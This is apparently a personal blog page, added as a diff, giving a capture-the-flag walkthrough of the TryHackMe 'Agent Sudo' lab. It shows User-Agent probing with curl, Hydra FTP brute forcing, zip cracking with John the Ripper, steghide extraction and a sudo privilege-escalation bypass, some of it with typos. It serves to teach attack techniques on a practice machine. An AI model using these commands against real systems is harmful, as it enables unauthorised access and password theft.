@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Saharsh Agrawal</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Agent Sudo WalkThrough | Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Agent Sudo WalkThrough" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Agent Sudo https://tryhackme.com/room/agentsudoctf Open Ports: 21: ftp 22: ssh 80: HTTP Port 80: Index Page we can brute force different Agents &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: A&quot; -L &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: B&quot; -L &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: C&quot; -L Port 21: Brute force ftp using Hydra to find the password hydra -l cxxxx -P /rockyou.txt ftp://ip After logging we will find 3 files (1 txt, 2 imgs) binwalk the image we find a zip file inside the image As the zip file is password protected we can use johnTheRipper to crack it. John2zip 8072.zip &gt; hash.txt John hash.txt --wordlist=/rockyou.tx Now we find a text file for Agent R It has the passwd in base64 echo &quot; &quot; |base64-d (Area51) Extracting cute-alien.jpeg file using the password found in To_AgentR.txt steghide extract -sf cute-alien.jpeg Gaining Access: We Found username and password in message.txt Logging in via ssh USER Flag: 2.Download the image scp james@ip:/home/james/image.jpeg . Now search in the web (use google image search) Privilege Escalation: sudo -l [All,!root] /bin/bash To bypass this sudo #u-1 /bin/bash Root Flag:" />
+<meta property="og:description" content="Agent Sudo https://tryhackme.com/room/agentsudoctf Open Ports: 21: ftp 22: ssh 80: HTTP Port 80: Index Page we can brute force different Agents &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: A&quot; -L &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: B&quot; -L &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: C&quot; -L Port 21: Brute force ftp using Hydra to find the password hydra -l cxxxx -P /rockyou.txt ftp://ip After logging we will find 3 files (1 txt, 2 imgs) binwalk the image we find a zip file inside the image As the zip file is password protected we can use johnTheRipper to crack it. John2zip 8072.zip &gt; hash.txt John hash.txt --wordlist=/rockyou.tx Now we find a text file for Agent R It has the passwd in base64 echo &quot; &quot; |base64-d (Area51) Extracting cute-alien.jpeg file using the password found in To_AgentR.txt steghide extract -sf cute-alien.jpeg Gaining Access: We Found username and password in message.txt Logging in via ssh USER Flag: 2.Download the image scp james@ip:/home/james/image.jpeg . Now search in the web (use google image search) Privilege Escalation: sudo -l [All,!root] /bin/bash To bypass this sudo #u-1 /bin/bash Root Flag:" />
+<meta property="og:site_name" content="Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-24T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Agent Sudo WalkThrough" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2020-05-24T00:00:00+00:00","datePublished":"2020-05-24T00:00:00+00:00","description":"Agent Sudo https://tryhackme.com/room/agentsudoctf Open Ports: 21: ftp 22: ssh 80: HTTP Port 80: Index Page we can brute force different Agents &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: A&quot; -L &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: B&quot; -L &gt;Curl &quot;http://ip&quot; -H &quot;User-Agent: C&quot; -L Port 21: Brute force ftp using Hydra to find the password hydra -l cxxxx -P /rockyou.txt ftp://ip After logging we will find 3 files (1 txt, 2 imgs) binwalk the image we find a zip file inside the image As the zip file is password protected we can use johnTheRipper to crack it. John2zip 8072.zip &gt; hash.txt John hash.txt --wordlist=/rockyou.tx Now we find a text file for Agent R It has the passwd in base64 echo &quot; &quot; |base64-d (Area51) Extracting cute-alien.jpeg file using the password found in To_AgentR.txt steghide extract -sf cute-alien.jpeg Gaining Access: We Found username and password in message.txt Logging in via ssh USER Flag: 2.Download the image scp james@ip:/home/james/image.jpeg . Now search in the web (use google image search) Privilege Escalation: sudo -l [All,!root] /bin/bash To bypass this sudo #u-1 /bin/bash Root Flag:","headline":"Agent Sudo WalkThrough","mainEntityOfPage":{"@type":"WebPage","@id":"/CTF/agentSudo"},"url":"/CTF/agentSudo"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/icon.jpg" /><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Home<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/saharshtapi" target="_blank"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://www.linkedin.com/in/saharsh-agrawal-146b991b4/" target="_blank"><i class="fab fa-linkedin-in"></i></a><a class="color-purple-hover" href="https://github.com/saharshtapi" target="_blank"><i class="fab fa-github-square"></i></a>
+        <a class="color--hover" href="" target="_blank"><i class="fas fa-"></i></a>
+
+    </span>
+    <br>
+  </div>
+
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <h1 id="agent-sudo">Agent Sudo</h1>
+<h1><img src="/images/agentsudo/front.png" alt="front" /></h1>
+<p><a href="https://tryhackme.com/room/agentsudoctf">https://tryhackme.com/room/agentsudoctf</a></p>
+
+<h2 id="open-ports">Open Ports:</h2>
+<ul>
+  <li>21: ftp</li>
+  <li>22: ssh</li>
+  <li>80: HTTP</li>
+</ul>
+
+<h2 id="port-80">Port 80:</h2>
+<ol>
+  <li><strong>Index Page</strong>
+<img src="/images/agentsudo/1.png" alt="1" />
+    <ul>
+      <li>we can brute force different Agents
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &gt;Curl "http://ip" -H "User-Agent: A" -L
+ &gt;Curl "http://ip" -H "User-Agent: B" -L
+ &gt;Curl "http://ip" -H "User-Agent: C" -L
+</code></pre></div>        </div>
+        <p><img src="/images/agentsudo/2.png" alt="2" /></p>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="port-21">Port 21:</h2>
+<ol>
+  <li>Brute force ftp using <strong>Hydra</strong>  to find the <em>password</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  hydra -l cxxxx -P /rockyou.txt ftp://ip
+</code></pre></div>    </div>
+    <p><img src="/images/agentsudo/3.png" alt="3" /></p>
+  </li>
+  <li>After logging we will find 3 files <em>(1 txt, 2 imgs)</em>
+    <ul>
+      <li>binwalk the image we find a zip file inside the image</li>
+      <li>As the zip file is password protected we can use <strong>johnTheRipper</strong> to crack it.
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> John2zip 8072.zip &gt; hash.txt
+ John hash.txt --wordlist=/rockyou.tx
+</code></pre></div>        </div>
+        <p><img src="/images/agentsudo/4.png" alt="4" /></p>
+      </li>
+    </ul>
+  </li>
+  <li>Now we find a text file for Agent R
+    <ul>
+      <li>It has the passwd in base64
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo " " |base64-d (Area51)
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Extracting cute-alien.jpeg file using the password found in <strong>To_AgentR.txt</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract -sf cute-alien.jpeg
+</code></pre></div>    </div>
+    <p><img src="/images/agentsudo/5.png" alt="5" /></p>
+  </li>
+</ol>
+
+<h2 id="gaining-access">Gaining Access:</h2>
+<p><strong>We Found username and password in <em>message.txt</em></strong></p>
+<ol>
+  <li>Logging in via ssh</li>
+</ol>
+
+<h3 id="user-flag">USER Flag:</h3>
+<p><img src="/images/agentsudo/user.png" alt="user" />
+2.Download the image</p>
+<ul>
+  <li>scp james@ip:/home/james/image.jpeg .</li>
+  <li>Now search in the web (<em>use google image search</em>)</li>
+</ul>
+
+<h2 id="privilege-escalation">Privilege Escalation:</h2>
+<ol>
+  <li>sudo -l
+    <ul>
+      <li>[All,!root] /bin/bash
+   <strong>To bypass this</strong>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo #u-1 /bin/bash
+</code></pre></div>        </div>
+        <h3 id="root-flag">Root Flag:</h3>
+        <p><img src="/images/agentsudo/root.png" alt="root" /></p>
+      </li>
+    </ul>
+  </li>
+</ol>
+
+
+        <script src="https://tryhackme.com/badge/50613"></script>
+      </div>
+
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits" style="color: #fffdd0"><a href="https://github.com/saharhtapi" style="color: #fffdd0"></a>by <a href="https://github.com/saharshtapi" style="color: #fffdd0">TApI</a><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
